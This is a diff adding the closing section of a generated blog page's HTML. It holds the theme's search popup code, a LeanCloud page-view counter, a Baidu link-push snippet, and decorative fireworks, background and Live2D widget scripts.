+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+  
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<div class="bg_content">
+<canvas id="canvas"></canvas>
+</div>
+<!-- 雪花特效 -->
+<!--<script type="text/javascript">
+
+    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');
+
+</script>-->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
